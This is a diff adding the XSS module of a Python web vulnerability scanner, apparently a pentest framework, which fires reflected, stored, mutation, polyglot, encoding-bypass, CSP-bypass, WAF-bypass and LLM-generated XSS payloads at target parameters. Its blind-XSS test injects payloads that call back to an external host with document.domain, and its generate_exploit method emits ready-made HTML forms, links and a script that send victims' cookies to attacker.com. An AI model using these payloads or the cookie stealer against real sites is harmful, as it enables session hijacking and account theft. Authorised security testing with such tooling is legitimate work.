@@ -1,0 +1,547 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+ATOMIC FRAMEWORK - XSS Module
+Cross-Site Scripting detection and exploitation
+"""
+
+import re
+
+
+from config import Payloads, Colors
+from modules.base import BaseModule
+
+
+class XSSModule(BaseModule):
+    """XSS Testing Module"""
+
+    name = "XSS"
+    vuln_type = "xss"
+
+    def __init__(self, engine):
+        super().__init__(engine)
+
+        # XSS signatures
+        self.xss_signatures = [
+            "<script>",
+            "javascript:",
+            "onerror=",
+            "onload=",
+            "onmouseover=",
+            "onclick=",
+            "onfocus=",
+            "eval(",
+            "alert(",
+            "confirm(",
+            "prompt(",
+        ]
+
+    def test(self, url: str, method: str, param: str, value: str):
+        """Test for XSS"""
+        # Test reflected XSS
+        self._test_reflected(url, method, param, value)
+
+        # Test stored XSS (limited)
+        self._test_stored(url, method, param, value)
+
+        # Test DOM XSS indicators
+        self._test_dom(url, method, param, value)
+
+        # Test mutation XSS
+        self._test_mxss(url, method, param, value)
+
+        # Test blind XSS
+        self._test_blind_xss(url, method, param, value)
+
+        # Test CSP bypass
+        self._test_csp_bypass(url, method, param, value)
+
+        # Test polyglot payloads
+        self._test_polyglot(url, method, param, value)
+
+        # Test encoding bypass
+        self._test_encoding_bypass(url, method, param, value)
+
+        # LLM-generated adaptive XSS payloads
+        self._test_llm_payloads(url, method, param, value)
+
+    def _test_mxss(self, url: str, method: str, param: str, value: str):
+        """Test for mutation XSS (mXSS)"""
+        # Get baseline to filter pre-existing content
+        try:
+            baseline_response = self.requester.request(url, method, data={param: value})
+            baseline_text = baseline_response.text if baseline_response else ""
+        except Exception:
+            baseline_text = ""
+
+        payloads = [
+            "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
+            "<svg><animate onbegin=alert(1) attributeName=x>",
+            "<details open ontoggle=alert(1)>",
+        ]
+        for payload in payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                # Only flag if the full payload is reflected and was NOT in baseline
+                if payload in response.text and payload not in baseline_text:
+                    # Verify it's not HTML-encoded
+                    if not self._is_sanitized(payload, response.text):
+                        from core.engine import Finding
+
+                        finding = Finding(
+                            technique="XSS (Mutation XSS / mXSS)",
+                            url=url,
+                            severity="HIGH",
+                            confidence=0.85,
+                            param=param,
+                            payload=payload,
+                            evidence="mXSS payload reflected unescaped in response",
+                        )
+                        self.engine.add_finding(finding)
+                        return
+            except Exception:
+                continue
+
+    def _test_blind_xss(self, url: str, method: str, param: str, value: str):
+        """Test for blind XSS via callback.
+
+        A blind XSS payload only fires inside a victim's browser when
+        the stored output is rendered later — there is no synchronous
+        signal in the immediate HTTP response.  The previous
+        implementation reported a finding on EVERY request that
+        returned without an exception, which generated one false
+        positive per parameter regardless of whether the payload was
+        accepted, encoded, dropped, or even reflected.
+
+        Correct verification requires an out-of-band listener: inject
+        a payload carrying a unique callback URL, then poll the
+        listener for a hit.  We only emit a finding when the listener
+        actually receives the callback.
+
+        When no OOB infrastructure is wired into the engine the test
+        is a no-op — silent absence is preferable to noisy false
+        positives.
+        """
+        oob_manager = getattr(self.engine, "oob_manager", None)
+        if oob_manager is None or not getattr(oob_manager, "enabled", False):
+            return
+
+        for template in (
+            '"><script src=https://{host}/x.js></script>',
+            "'><img src=x onerror=fetch('https://{host}/'+document.domain)>",
+        ):
+            try:
+                token, callback_url = oob_manager.get_callback_url(
+                    vuln_type="xss_blind", url=url, param=param,
+                )
+                if not token or not callback_url:
+                    continue
+
+                from urllib.parse import urlparse as _urlparse
+                callback_host = _urlparse(callback_url).hostname or token
+                payload = template.format(host=callback_host)
+
+                self.requester.request(url, method, data={param: payload})
+
+                # Poll the listener: real blind XSS triggers later (when
+                # an admin/user visits the rendered page), so a short
+                # timeout will rarely fire — that's acceptable.  We
+                # surface a finding ONLY on a real hit.
+                hits = oob_manager.check(token, timeout=5)
+                if not hits:
+                    continue
+
+                from core.engine import Finding
+
+                finding = Finding(
+                    technique="XSS (Blind XSS Callback)",
+                    url=url,
+                    severity="HIGH",
+                    confidence=0.95,
+                    param=param,
+                    payload=payload,
+                    evidence=(
+                        f"Blind XSS callback received on token {token} "
+                        f"({len(hits)} hit(s)) — payload executed in a victim browser."
+                    ),
+                )
+                self.engine.add_finding(finding)
+                return
+            except Exception:
+                continue
+
+    def _test_csp_bypass(self, url: str, method: str, param: str, value: str):
+        """Test for CSP bypass XSS.
+
+        Compares against a baseline response captured with the original
+        ``value``.  Without baseline filtering, pages that echo the URL
+        or query string verbatim (404 templates, debug pages, search
+        result echoes) trigger a finding for every parameter, since
+        the payload appears in the response only because it was sent
+        — not because it was reflected as executable HTML.
+        """
+        try:
+            baseline_response = self.requester.request(url, method, data={param: value})
+            baseline_text = baseline_response.text if baseline_response else ""
+        except Exception:
+            baseline_text = ""
+
+        payloads = [
+            '<base href="https://evil.example.com/">',
+            '{{constructor.constructor("alert(1)")()}}',
+        ]
+        for payload in payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                # Only flag when the payload is reflected AND was NOT
+                # already in the baseline (rules out generic echo of
+                # the URL/query string by the page template).
+                if payload in response.text and payload not in baseline_text:
+                    from core.engine import Finding
+
+                    finding = Finding(
+                        technique="XSS (CSP Bypass)",
+                        url=url,
+                        severity="HIGH",
+                        confidence=0.7,
+                        param=param,
+                        payload=payload,
+                        evidence="CSP bypass payload reflected (not present in baseline)",
+                    )
+                    self.engine.add_finding(finding)
+                    return
+            except Exception:
+                continue
+
+    def _test_polyglot(self, url: str, method: str, param: str, value: str):
+        """Test for XSS with polyglot payloads.
+
+        Same baseline rationale as :meth:`_test_csp_bypass`: pages that
+        echo the URL/query (e.g. 404 pages, search result pages,
+        debug error pages) reflect anything we send and would trigger
+        a finding on every parameter without baseline filtering.
+        """
+        try:
+            baseline_response = self.requester.request(url, method, data={param: value})
+            baseline_text = baseline_response.text if baseline_response else ""
+        except Exception:
+            baseline_text = ""
+
+        payloads = [
+            "jaVasCript:/*-/*`/*'/*\"/**/(/* */oNcliCk=alert() )//",
+            "'-alert()-'",
+            "</script><svg onload=alert()>",
+            "'\"><svg/onload=alert(1)//",
+            "<img src=x onerror=alert(1)//>",
+            "<video><source onerror=alert(1)>",
+            "<body onpageshow=alert(1)>",
+        ]
+        for payload in payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                # Only flag when the payload is reflected AND was NOT
+                # already in the baseline.
+                if payload in response.text and payload not in baseline_text:
+                    from core.engine import Finding
+
+                    finding = Finding(
+                        technique="XSS (Polyglot)",
+                        url=url,
+                        severity="HIGH",
+                        confidence=0.8,
+                        param=param,
+                        payload=payload,
+                        evidence="Polyglot XSS payload reflected (not present in baseline)",
+                    )
+                    self.engine.add_finding(finding)
+                    return
+            except Exception:
+                continue
+
+    def _test_encoding_bypass(self, url: str, method: str, param: str, value: str):
+        """Test for XSS with encoding bypass payloads"""
+        payloads = [
+            "<svg/onload=alert(1)>",  # No quotes, no spaces
+            "<img src=x onerror=alert`1`>",  # Template literal
+            "<svg onload=alert&lpar;1&rpar;>",  # HTML entity parentheses
+            "\\u003csvg onload=alert(1)\\u003e",  # Unicode escape
+            "<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>",  # HTML entity function name
+        ]
+        for payload in payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                if payload in response.text:
+                    from core.engine import Finding
+
+                    finding = Finding(
+                        technique="XSS (Encoding Bypass)",
+                        url=url,
+                        severity="HIGH",
+                        confidence=0.85,
+                        param=param,
+                        payload=payload,
+                        evidence="Encoding bypass payload reflected unmodified",
+                    )
+                    self.engine.add_finding(finding)
+                    return
+            except Exception:
+                continue
+
+    def _test_llm_payloads(self, url: str, method: str, param: str, value: str):
+        """Test with LLM-generated adaptive XSS payloads.
+
+        Uses Qwen2.5-7B to produce context-aware payloads when the local
+        LLM is loaded (``--local-llm``).  Gracefully skips otherwise.
+        """
+        ai = getattr(self.engine, "ai", None)
+        if ai is None:
+            return
+        llm_payloads = ai.get_llm_payloads("xss", param)
+        if not llm_payloads:
+            return
+
+        for payload in llm_payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                if payload in response.text:
+                    from core.engine import Finding
+
+                    finding = Finding(
+                        technique="XSS (AI-generated Reflected)",
+                        url=url,
+                        severity="HIGH",
+                        confidence=0.80,
+                        param=param,
+                        payload=payload,
+                        evidence="AI payload reflected unescaped in response",
+                    )
+                    self.engine.add_finding(finding)
+                    return
+            except Exception:
+                continue
+
+    def test_url(self, url: str):
+        """Test URL for XSS"""
+
+    def _test_reflected(self, url: str, method: str, param: str, value: str):
+        """Test for reflected XSS"""
+        payloads = Payloads.XSS_PAYLOADS
+
+        # Apply WAF bypass if enabled
+        if self.engine.config.get("waf_bypass"):
+            all_payloads = []
+            for p in payloads:
+                all_payloads.extend(self.requester.waf_bypass_encode(p))
+            payloads = list(set(all_payloads))
+
+        for payload in payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+
+                if not response:
+                    continue
+
+                response_text = response.text
+
+                # Check if payload is reflected
+                if payload in response_text:
+                    # Detect HTML context of the reflection
+                    context_info = ""
+                    context_confidence = None
+                    escaped_payload = re.escape(payload)
+                    if re.search(r"<script[^>]*>.*?" + escaped_payload, response_text, re.DOTALL | re.IGNORECASE):
+                        context_info = " (reflected inside <script> tag context)"
+                        context_confidence = 0.95
+                    elif re.search(r'=[\'"]' + escaped_payload, response_text):
+                        context_info = " (reflected inside HTML attribute context)"
+                        context_confidence = 0.85
+
+                    # Check if it's properly sanitized
+                    sanitized = self._is_sanitized(payload, response_text)
+
+                    from core.engine import Finding
+
+                    if not sanitized:
+                        finding = Finding(
+                            technique="XSS (Reflected)",
+                            url=url,
+                            severity="HIGH",
+                            confidence=context_confidence if context_confidence else 0.9,
+                            param=param,
+                            payload=payload,
+                            evidence="Payload reflected without sanitization" + context_info,
+                        )
+                    else:
+                        finding = Finding(
+                            technique="XSS (Potentially Filtered)",
+                            url=url,
+                            severity="MEDIUM",
+                            confidence=context_confidence if context_confidence else 0.6,
+                            param=param,
+                            payload=payload,
+                            evidence="Payload reflected but may be sanitized" + context_info,
+                        )
+
+                    self.engine.add_finding(finding)
+                    return
+
+            except Exception as e:
+                if self.engine.config.get("verbose"):
+                    print(f"{Colors.error(f'XSS test error: {e}')}")
+
+    def _test_stored(self, url: str, method: str, param: str, value: str):
+        """Test for stored XSS (basic check)"""
+        # Use a unique marker to identify our payload
+        import uuid
+
+        marker = f"xss_{uuid.uuid4().hex[:8]}"
+        stored_payloads = [
+            f'<script>alert("{marker}")</script>',
+            f'<img src=x onerror=alert("{marker}")>',
+        ]
+
+        for payload in stored_payloads:
+            try:
+                # Submit the payload
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+
+                if response and response.status_code == 200:
+                    # Re-fetch the same page to check if payload is stored
+                    verify_response = self.requester.request(url, "GET")
+
+                    if verify_response and marker in verify_response.text:
+                        # Check if full payload (not just the marker text) is reflected
+                        if payload in verify_response.text:
+                            from core.engine import Finding
+
+                            finding = Finding(
+                                technique="XSS (Stored)",
+                                url=url,
+                                severity="CRITICAL",
+                                confidence=0.85,
+                                param=param,
+                                payload=payload,
+                                evidence="Payload persisted and reflected on page reload",
+                            )
+                            self.engine.add_finding(finding)
+                            return
+
+            except Exception as e:
+                if self.engine.config.get("verbose"):
+                    print(f"{Colors.error(f'Stored XSS test error: {e}')}")
+
+    def _test_dom(self, url: str, method: str, param: str, value: str):
+        """Test for DOM XSS indicators"""
+        dom_indicators = [
+            "document.write",
+            "document.location",
+            "window.location",
+            "eval(",
+            "innerHTML",
+            "outerHTML",
+            "insertAdjacentHTML",
+            "setTimeout(",
+            "setInterval(",
+        ]
+
+        try:
+            response = self.requester.request(url, "GET")
+
+            if not response:
+                return
+
+            for indicator in dom_indicators:
+                if indicator in response.text:
+                    # Check if user input reaches these sinks
+                    test_value = "xss_test_12345"
+                    data = {param: test_value}
+
+                    test_response = self.requester.request(url, method, data=data)
+
+                    if test_response and test_value in test_response.text:
+                        # Check if it's near a DOM sink
+                        pattern = rf"{re.escape(indicator)}.*{re.escape(test_value)}|{re.escape(test_value)}.*{re.escape(indicator)}"
+                        if re.search(pattern, test_response.text, re.DOTALL):
+                            from core.engine import Finding
+
+                            finding = Finding(
+                                technique="XSS (DOM-based)",
+                                url=url,
+                                severity="MEDIUM",
+                                confidence=0.7,
+                                param=param,
+                                payload=test_value,
+                                evidence=f"User input reaches DOM sink: {indicator}",
+                            )
+                            self.engine.add_finding(finding)
+                            return
+
+        except Exception as e:
+            if self.engine.config.get("verbose"):
+                print(f"{Colors.error(f'DOM XSS test error: {e}')}")
+
+    def _is_sanitized(self, payload: str, response: str) -> bool:
+        """Check if payload was sanitized"""
+        # Check for common sanitization patterns
+        sanitized_patterns = [
+            "&lt;",  # HTML entities
+            "&gt;",
+            "&quot;",
+            "&#x3C;",  # Hex encoding
+            "&#x3E;",
+            "\\x3c",  # JS escaping
+            "\\x3e",
+            "\\u003c",  # Unicode escaping
+            "\\u003e",
+        ]
+
+        for pattern in sanitized_patterns:
+            if pattern in response:
+                return True
+
+        # Check if script tags were removed
+        if "<script>" in payload and "<script>" not in response:
+            return True
+
+        return False
+
+    def generate_exploit(self, url: str, param: str, xss_type: str = "reflected") -> str:
+        """Generate XSS exploit code"""
+        if xss_type == "reflected":
+            exploit = f"""
+<!-- XSS Exploit -->
+<form action="{url}" method="GET">
+    <input type="hidden" name="{param}" value='<script>fetch("http://attacker.com/?c="+document.cookie)</script>'>
+    <input type="submit" value="Click to steal cookies">
+</form>
+
+<!-- Or direct link -->
+<a href="{url}?{param}=<script>fetch('http://attacker.com/?c='+document.cookie)</script>">Click here</a>
+"""
+        else:
+            exploit = """
+<!-- Stored XSS would be triggered when visiting the affected page -->
+<script>
+// Cookie stealer
+fetch('http://attacker.com/?c=' + document.cookie);
+</script>
+"""
+
+        return exploit
